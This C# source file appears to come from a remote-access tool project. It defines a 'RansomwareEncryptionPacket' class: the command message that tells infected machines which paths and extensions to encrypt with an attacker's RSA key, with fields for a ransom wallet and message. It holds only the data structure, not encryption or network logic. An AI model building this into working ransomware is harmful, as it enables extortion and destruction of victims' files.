using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RansomwareEncryptionPacket : IPacket
    {
        public RansomwareEncryptionPacket(PacketType packetType) : base()
        {
            this.packetType = packetType;
        }

        public RansomwareEncryptionPacket(string publicRSAServerKey, List<string> paths, bool subDirectories, bool checkExtensions) : base()
        {
            this.packetType = PacketType.RANSOMWARE_ENCRYPTION;
            this.publicRSAServerKey = publicRSAServerKey;
            this.paths = paths;
            this.subDirectories = subDirectories;
            this.checkExtensions = checkExtensions;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string publicRSAServerKey { get; set; }
        public List<string> paths { get; set; }
        public List<string> extensions { get; set; }
        public bool subDirectories { get; set; }
        public bool checkExtensions { get; set; }
        public string wallet { get; set; }
        public string msg { get; set; }
    }
}
